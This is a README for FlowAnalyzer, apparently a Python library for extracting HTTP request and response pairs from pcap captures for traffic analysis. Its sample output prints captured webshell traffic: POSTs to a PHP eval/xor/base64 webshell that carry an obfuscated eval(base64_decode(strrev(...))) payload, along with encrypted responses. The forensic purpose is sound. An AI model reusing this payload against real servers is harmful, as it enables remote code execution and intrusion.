# FlowAnalyzer

# Installation

Install the package using pip:

```
pip3 install FlowAnalyzer
```

```
pip3 install FlowAnalyzer -i https://pypi.org/simple
```

# Usage

```
$ git clone https://github.com/Byxs20/FlowAnalyzer.git
$ cd ./FlowAnalyzer/
```

```python
# sourcery skip: use-fstring-for-formatting
import os
from FlowAnalyzer import FlowAnalyzer


baseDir = os.path.dirname(os.path.abspath(__file__))
flowPath = os.path.join(baseDir, "flow.pcapng")
display_filter = "(http.request and urlencoded-form) or (http.request and data-text-lines) or (http.request and mime_multipart) or (http.response.code == 200 and data-text-lines)"

jsonPath = FlowAnalyzer.get_json_data(flowPath, display_filter=display_filter)
for count, http in enumerate(FlowAnalyzer(jsonPath).generate_http_dict_pairs(), start=1):
    print(f"[+] 正在处理第{count}个HTTP流!")
    
    request, response = http.request, http.response
    if request:
        request_num, header, file_data, time_epoch = request.frame_num, request.header, request.file_data, request.time_epoch
        print("序号: {}请求包, 请求头: {}, 文件: {}, 时间: {}".format(request_num, header, file_data, time_epoch))

    if response:
        response_num, header, file_data, time_epoch = response.frame_num, response.header, response.file_data, response.time_epoch
        print("序号: {}请求包, 请求头: {}, 文件: {}, 时间: {}".format(response_num, header, file_data, time_epoch))
```

```
$ python3 .\tests\demo.py
[+] 正在处理第1个HTTP流!
序号: 2请求包, 请求头: b'POST /upload/php_eval_xor_base64.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\nCookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3;\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nHost: 192.168.225.129\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 1403', 文件: b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTF1YCWEn3M%2BF4ZGJ%2BL2Iz5EofTe8udar8%2BTGDwKtg8LxWYhFKlauQQtYfPnQDdprPQMrHPVjA6hjPeOQNpHlpcBNa5IHIHHrIHEy7jch%2Fv3Z2Y0lq8qSQQkYhwWZhxVpNq1liOGE%3D', 时间: 1682596262.982344
序号: 3请求包, 请求头: b'HTTP/1.1 200 OK\r\nServer: openresty/1.15.8.1\r\nDate: Thu, 27 Apr 2023 11:51:02 GMT\r\nContent-Type: text/html\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nX-Powered-By: PHP/5.5.38\r\nSet-Cookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache', 文件: b'70\r\n72a9c691ccdaab98fL1tMGI4YTljMh76GrwuHij67J+qF+t2KR17BwHlSvtL1mdSPnoksIZRS0N0Xi89+zNlNaUo+3xjMTU=b4c4e1f6ddd2a488\r\n0\r\n\r\n', 时间: 1682596262.992406
[+] 正在处理第2个HTTP流!
序号: 5请求包, 请求头: b'POST /upload/php_eval_xor_base64.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\nCookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3;\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nHost: 192.168.225.129\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 1409', 文件: b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTF1cCWEn3M%2BF4ZGJ%2BL2Iz5EofTe8udar8%2BTGDwKtg8LxWYhFKlauQQtYfPnQDdprPQMrHPVjA6hjPeOTReMrqj%2Fx6aH4XU%2BWInBcrzUhN6o%2FMfL54MmpIY6avwUcSIJBkZUuq7rVUYzE1', 时间: 1682596266.652869
序号: 6请求包, 请求头: b'HTTP/1.1 200 OK\r\nServer: openresty/1.15.8.1\r\nDate: Thu, 27 Apr 2023 11:51:06 GMT\r\nContent-Type: text/html\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nX-Powered-By: PHP/5.5.38\r\nSet-Cookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache', 文件: b'40\r\n72a9c691ccdaab98fL1tMGI4YTljMh4dHdNjM6AJ3DZmOGE5b4c4e1f6ddd2a488\r\n0\r\n\r\n', 时间: 1682596266.661427
[+] 正在处理第3个HTTP流!
序号: 8请求包, 请求头: b'POST /upload/php_eval_xor_base64.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\nCookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3;\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nHost: 192.168.225.129\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 1427', 文件: b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTL1ACWEn3M%2BF4ZGJ%2BL2Iz5EofTe8udar8%2BTGDwKtg8LxWYhFKlauQQtYfPnQDdprPQMrHPVjA6hjPeOSdqCqaPC9ZW7GI7C2kIPd0MqlXzqT3svOl%2B1gNW3x0TL4%2BUQ0cdgeygrWzt1XSzu7opY93Nvl1tILnOWMx', 时间: 1682596308.573707
序号: 9请求包, 请求头: b'HTTP/1.1 200 OK\r\nServer: openresty/1.15.8.1\r\nDate: Thu, 27 Apr 2023 11:51:48 GMT\r\nContent-Type: text/html\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nX-Powered-By: PHP/5.5.38\r\nSet-Cookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache', 文件: b'50\r\n72a9c691ccdaab98fL1tMGI4YTljMn75e3jORcmaTQZQeEdS2jE3TKPMeDNjNg==b4c4e1f6ddd2a488\r\n0\r\n\r\n', 时间: 1682596308.582312
```

# Contributing
Feel free to submit issues or pull requests if you have any suggestions, improvements, or bug reports.

# License

This project is licensed under the [MIT License.](LICENSE)
